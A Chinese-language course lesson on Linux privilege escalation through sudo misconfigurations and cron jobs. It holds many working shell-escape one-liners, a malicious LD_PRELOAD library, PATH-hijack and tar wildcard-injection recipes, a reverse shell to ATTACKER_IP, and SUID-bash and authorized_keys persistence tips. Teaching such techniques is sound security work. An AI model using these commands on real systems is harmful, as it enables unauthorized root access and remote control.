---
title: Day054：Linux 提权 - Sudo 与 Cron 任务利用
tags:
  - 网络安全
  - Linux提权
  - Sudo
  - Cron
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d054
date: 2026-03-17
updated: 2026-01-28
---

# Day054：Linux 提权 - Sudo 与 Cron 任务利用

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 9：系统提权入门 |
| **今日主题** | Sudo 配置错误与 Cron 任务提权 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你拿到的 shell 用户可以执行 `sudo -l`，输出显示可以用 sudo 运行某些命令。另外，你发现 `/etc/crontab` 里有一个定时任务每分钟执行一个脚本。
>
> **问题**：这些能用来提权吗？怎么利用？
>
> **今天的任务**：学习 sudo 配置错误和 Cron 任务的提权技术——这是最常见的提权向量之一。

---

## 今日目标

- [ ] 理解 sudo 配置与滥用
- [ ] 掌握常见 sudo 提权方法
- [ ] 学会利用 Cron 任务提权
- [ ] 理解 PATH 劫持与通配符注入

**闯关条件**：通过 sudo 或 Cron 任务成功提权到 root。

---

## 实战任务（先动手！）

### 任务 1：Sudo 配置分析（30 分钟）

**检查 sudo 权限**：
```bash
# 查看当前用户的 sudo 权限
sudo -l

# 示例输出
User user1 may run the following commands on victim:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/find
    (ALL : ALL) /usr/bin/env
```

**sudo -l 输出解读**：
```
(ALL) NOPASSWD: /usr/bin/vim
  │      │            └── 可执行的命令
  │      └── 不需要密码
  └── 可以以任何用户身份执行

(root) /usr/bin/find
  └── 只能以 root 身份执行

(ALL : ALL) /usr/bin/env
   │     └── 可以以任何组身份
   └── 可以以任何用户身份
```

**sudoers 文件格式**：
```
# 位置：/etc/sudoers

# 格式
用户 主机=(运行用户:运行组) 命令

# 示例
user1 ALL=(ALL:ALL) ALL           # 完全 sudo 权限
user2 ALL=(root) NOPASSWD: /bin/cat  # 免密以 root 运行 cat
%admin ALL=(ALL) ALL               # admin 组成员有完全权限
```

**记录**：
```
sudo -l 输出：________________
可利用的命令：________________
```

---

### 任务 2：Sudo 命令提权（50 分钟）

**常见可利用 sudo 命令**：

**1. vim/vi**：
```bash
# 检查
sudo -l
(root) NOPASSWD: /usr/bin/vim

# 提权
sudo vim -c ':!/bin/sh'

# 或在 vim 内
:!/bin/sh
```

**2. find**：
```bash
sudo find . -exec /bin/sh \; -quit
```

**3. awk**：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**4. less/more**：
```bash
sudo less /etc/passwd
!/bin/sh
```

**5. man**：
```bash
sudo man man
!/bin/sh
```

**6. nmap**：
```bash
# 老版本
sudo nmap --interactive
!sh

# 新版本
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

**7. env**：
```bash
sudo env /bin/sh
```

**8. python**：
```bash
sudo python -c 'import pty;pty.spawn("/bin/sh")'
```

**9. perl**：
```bash
sudo perl -e 'exec "/bin/sh";'
```

**10. tar**：
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**11. zip**：
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

**12. git**：
```bash
sudo git -p help config
!/bin/sh
```

**GTFOBins sudo 查询**：
```
https://gtfobins.github.io/

每个程序都有 Sudo 标签
直接复制对应的提权命令
```

**记录**：
```
成功利用的 sudo 命令：________________
使用的 payload：________________
```

---

### 任务 3：Sudo 高级利用（30 分钟）

**利用 NOPASSWD + 通配符**：
```bash
# sudoers 配置
user ALL=(root) NOPASSWD: /usr/bin/find /var/log/*

# 利用（路径遍历）
sudo find /var/log/../../root -exec /bin/sh \;
```

**利用 LD_PRELOAD**：
```bash
# 如果 sudoers 允许设置环境变量
Defaults env_keep += LD_PRELOAD

# 创建恶意共享库
# shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}

# 编译
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# 利用
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/任何sudo可执行的命令
```

**利用 LD_LIBRARY_PATH**：
```bash
# 类似 LD_PRELOAD
# 但需要程序加载特定库

# 查看程序依赖的库
ldd /usr/bin/target_program

# 创建同名恶意库
# 放到 LD_LIBRARY_PATH 指定的目录
```

**Sudo 版本漏洞**：
```bash
# 检查 sudo 版本
sudo --version

# 著名漏洞
# CVE-2019-14287：sudo < 1.8.28
# 利用 -u#-1 绕过限制
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)：sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
# 堆溢出漏洞，可获取 root
```

**记录**：
```
sudo 版本：________________
可利用的漏洞：________________
```

---

### 任务 4：Cron 任务提权（45 分钟）

**发现 Cron 任务**：
```bash
# 系统 cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# 用户 cron
crontab -l
ls -la /var/spool/cron/crontabs/

# 使用 pspy 监控
./pspy64
```

**Cron 格式解读**：
```bash
# /etc/crontab 内容
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m  h  dom mon dow user  command
*/1 *  *   *   *   root  /opt/scripts/backup.sh
#│  │  │   │   │    │           └── 执行的命令
#│  │  │   │   │    └── 执行用户
#│  │  │   │   └── 星期几
#│  │  │   └── 月份
#│  │  └── 日期
#│  └── 小时
#└── 分钟

# */1 = 每分钟
```

**提权方法 1：可写脚本**：
```bash
# 发现 cron 执行的脚本
cat /etc/crontab
*/1 * * * * root /opt/backup.sh

# 检查权限
ls -la /opt/backup.sh
-rwxrwxrwx 1 root root ... /opt/backup.sh

# 可写！添加反向 shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# 或添加 SUID bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh

# 等待 cron 执行，获得 root
/tmp/bash -p
```

**提权方法 2：PATH 劫持**：
```bash
# crontab 内容
PATH=/home/user:/usr/local/sbin:/usr/local/bin

* * * * * root backup
# 注意：执行的是 backup，不是 /usr/bin/backup

# 如果 /home/user 可写且在 PATH 前面
echo '#!/bin/bash' > /home/user/backup
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /home/user/backup
chmod +x /home/user/backup

# cron 会执行你的 backup 而不是真正的
```

**提权方法 3：通配符注入**：
```bash
# cron 任务
* * * * * root cd /tmp && tar -zcf backup.tar.gz *

# 通配符 * 会展开文件名
# tar 有检查点功能可执行命令

# 创建恶意文件
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/shell.sh
chmod +x /tmp/shell.sh
touch /tmp/--checkpoint=1
touch /tmp/'--checkpoint-action=exec=sh shell.sh'

# tar 展开后变成
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...

# 执行 shell.sh！
```

**记录**：
```
发现的 Cron 任务：________________
利用方法：________________
```

---

### 任务 5：环境变量与库劫持（25 分钟）

**PATH 环境变量劫持**：
```bash
# 如果程序使用相对路径调用命令
# /opt/script.sh 内容：
#!/bin/bash
cp file1 file2

# cp 没有使用绝对路径

# 劫持
echo '/bin/bash -p' > /tmp/cp
chmod +x /tmp/cp
export PATH=/tmp:$PATH

# 运行 script.sh 时会执行你的 cp
```

**共享库劫持**：
```bash
# 如果程序有配置错误的 RPATH
# 或搜索路径中有可写目录

# 查看库搜索路径
ldd /usr/bin/program

# 查看 RPATH
readelf -d /usr/bin/program | grep RPATH

# 创建恶意库替换
```

**记录**：
```
发现的劫持机会：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 sudo 配置 | 20 分 |
| 成功 sudo 提权 | 25 分 |
| 发现 Cron 任务 | 15 分 |
| 成功 Cron 提权 | 25 分 |
| 理解环境变量劫持 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### Sudo 工作原理

```
sudo 工作流程：
1. 用户执行 sudo command
2. sudo 检查 /etc/sudoers
3. 验证用户是否有权限
4. 验证密码（除非 NOPASSWD）
5. 以目标用户身份执行命令
6. 记录日志

安全依赖：
- sudoers 配置正确
- 允许的命令无法逃逸
```

### Cron 工作原理

```
Cron 守护进程：
1. 定期检查 crontab 文件
2. 按时间表执行任务
3. 以指定用户身份运行

关键点：
- /etc/crontab 中任务以 root 运行
- 用户 crontab 以该用户身份运行
- 环境变量可能与交互 shell 不同
```

### 为什么这些提权有效

```
Sudo 提权：
- 管理员给予了过多权限
- 某些程序可以执行任意命令
- 信任程序，但程序有"逃逸"功能

Cron 提权：
- 任务以高权限运行
- 脚本/文件权限配置错误
- 环境变量可被劫持
- 通配符展开可被利用
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| sudo 需要密码 | 无法执行 | 只能利用 NOPASSWD 命令 |
| Cron 不执行 | 脚本没运行 | 检查脚本权限、语法、路径 |
| PATH 劫持失败 | 真正的程序被执行 | 检查 PATH 顺序 |
| 通配符注入失败 | 文件名未被解析 | 检查 shell 和命令 |

---

## 知识卡片速查

### Sudo 提权速查

```bash
# 查看权限
sudo -l

# 常见提权
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \;
sudo python -c 'import pty;pty.spawn("/bin/sh")'
sudo env /bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
```

### Cron 提权速查

```bash
# 发现任务
cat /etc/crontab
ls -la /etc/cron.*
pspy64

# 可写脚本
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/script.sh

# PATH 劫持
echo '#!/bin/bash' > /tmp/command
echo 'bash -p' >> /tmp/command
chmod +x /tmp/command
export PATH=/tmp:$PATH
```

### 通配符注入速查

```bash
# tar
touch /tmp/--checkpoint=1
touch /tmp/'--checkpoint-action=exec=sh script.sh'

# chown（rsync 等类似）
touch /tmp/'--reference=/etc/passwd'
```

---

## 常见问题

**Q1：sudo 允许的命令很少怎么办？**

A1：
- 查看 GTFOBins 是否有该命令
- 检查命令是否允许参数
- 寻找其他提权向量

**Q2：找不到可利用的 Cron 任务？**

A2：
- 用 pspy 监控后台进程
- 检查所有 cron 目录
- 看是否有 systemd timer

**Q3：提权成功但只有一次性 shell？**

A3：
- 创建 SUID bash：`cp /bin/bash /tmp/bash; chmod +s /tmp/bash`
- 添加 SSH 密钥：写入 /root/.ssh/authorized_keys
- 创建新用户：添加到 /etc/passwd 和 /etc/shadow

---

## 明日预告

**Day 055：Windows 提权基础 - 信息收集与用户枚举**

明天你将：
- 学习 Windows 权限模型
- 掌握 Windows 提权信息收集
- 了解 Windows 提权向量

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功利用的 sudo 命令 | |
| 成功利用的 Cron 任务 | |
| 今日收获 | |

---

> **导师点评**：
>
> Sudo 和 Cron 是 Linux 提权的"金矿"。
>
> 很多管理员为了方便，给用户配置了过于宽松的 sudo 权限。"反正只是 vim，能有什么问题？"——殊不知 vim 可以直接开 shell。
>
> Cron 任务更是经常被忽视。脚本写好了，运行正常了，谁还会去检查权限？结果就是全局可写的脚本以 root 身份每分钟执行一次。
>
> **安全的本质是"最小权限原则"。给用户的权限越少越好，给程序的权限也越少越好**。

```bash
echo "Day 054 Complete! Sudo/Cron 提权高手！"
```
